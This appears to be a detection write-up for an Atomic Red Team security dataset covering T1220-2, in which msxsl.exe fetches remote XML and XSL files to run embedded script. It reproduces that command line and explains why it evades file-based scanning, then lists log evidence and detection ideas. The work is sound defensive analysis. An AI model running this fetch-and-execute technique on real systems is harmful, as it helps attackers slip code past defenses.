# T1220-2: XSL Script Processing — MSXSL Bypass Using Remote Files

## Technique Context

T1220 (XSL Script Processing) abuses XSLT processors to execute code embedded in XSL stylesheets. This variant extends the local-file approach (T1220-1) by passing HTTP URLs directly to `msxsl.exe` instead of local file paths:

```
msxsl.exe "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"
          "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"
```

`msxsl.exe` can accept URLs as arguments, fetching remote XML and XSL files over HTTP/HTTPS before processing them. This makes the technique a fileless variant: no XSL script code is written to disk locally. The malicious stylesheet is fetched from a remote server at execution time, reducing the disk footprint and potentially evading file-based scanning. In a real attack, the attacker controls the remote server and the XSL content.

The combination of a signed Microsoft binary (`msxsl.exe`) fetching remote content over HTTPS and executing embedded scripts is a powerful defense evasion chain.

## What This Dataset Contains

**Security EID 4688** captures `cmd.exe` (PID 0x4388) spawned by `powershell.exe` (PID 0x4104) with the full remote-URL command line:

```
"cmd.exe" /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\msxsl.exe"
"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"
"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"
```

Both GitHub raw content URLs are preserved verbatim. A second EID 4688 shows the cleanup `cmd.exe` running `del -Path C:\AtomicRedTeam\atomics\..\ExternalPayloads\msxsl.exe`.

**Sysmon EID 1** confirms the `cmd.exe` process creation (PID 17288) with the full command line and parent-child relationship (`powershell.exe` PID 16644 → `cmd.exe`).

The technique ultimately failed — `cmd.exe` exited with status `0x1`. The failure likely occurred because `msxsl.exe` encountered a network connectivity issue or an HTTP error when attempting to fetch the remote URLs, rather than a security control. With Defender disabled, the failure was environmental.

Total event counts: 0 Application, 107 PowerShell, 4 Security (EID 4688), 19 Sysmon.

This dataset is nearly structurally identical to T1220-1: the same event types, similar counts, same Sysmon coverage. The only meaningful difference is that the command line contains remote URLs rather than local file paths.

## What This Dataset Does Not Contain

No **Sysmon EID 1** for `msxsl.exe` itself appears — the same gap as in T1220-1. No **Sysmon EID 3** (network connection) events appear from `msxsl.exe` attempting to fetch the remote URLs. If `msxsl.exe` had successfully connected to GitHub, those network events would document the outbound connection. Their absence is consistent with either a DNS failure, a connectivity block, or `msxsl.exe` failing before attempting the network call.

No **Sysmon EID 22** (DNS) events for `raw.githubusercontent.com` appear. This further confirms the remote fetch never happened.

No code execution artifacts (child processes, file creation, DLL loads in `msxsl.exe`) appear, consistent with the failed execution.

The **PowerShell channel** (107 events) is test framework boilerplate.

Compared to T1220-1 (local files), this dataset is functionally identical from an event structure perspective, but the command lines contain the critical distinguishing detail: remote GitHub URLs rather than local paths.

## Assessment

The primary detection value of this dataset is the command line evidence in Security EID 4688 and Sysmon EID 1: `msxsl.exe` invoked with HTTPS URLs as arguments. This is the definitive behavioral pattern for the remote-file variant of T1220. Even though execution failed, the command line is fully preserved and contains both the tool name (`msxsl.exe`), the protocol (`https://`), and the target domain (`raw.githubusercontent.com`). Compared to the defended variant (36 Sysmon, 12 Security, 34 PowerShell), this undefended dataset has fewer Security events, consistent with Defender not generating blocking telemetry.

## Detection Opportunities Present in This Data

The following behavioral observables are directly present in the event records:

- **Security EID 4688** contains `msxsl.exe` invoked with `https://` URLs as arguments. `msxsl.exe` accepting HTTP/HTTPS URLs as file arguments in a command line is a specific T1220 remote-file variant indicator.
- The GitHub raw content URLs in the command line (`raw.githubusercontent.com/redcanaryco/atomic-red-team/...`) are directly searchable. Real attacks use attacker-controlled domains, but the pattern of `msxsl.exe` + URL arguments is consistent regardless of the hosting location.
- **Security EID 4688** shows the parent chain `powershell.exe` → `cmd.exe` → (msxsl.exe). Automated PowerShell spawning a cmd.exe that invokes XSLT processing with remote URLs is a high-fidelity indicator.
- The `msxsl.exe` binary is located at `ExternalPayloads\`, outside standard Windows directories. `msxsl.exe` is not a Windows inbox tool — its presence at any location implies it was deliberately staged. Detecting any process creation where `msxsl.exe` is the executable name, regardless of path, is a valid detection approach.
- **Sysmon EID 1** for `cmd.exe` captures the full command line with URLs, file hashes (`SHA256=A6E3B3B22B7FE8CE2C9245816126723EAA13F43B9F591883E59959A2D409426A` for `cmd.exe`), and process lineage, enabling correlation with T1220-1 where the same `cmd.exe` hash appears.
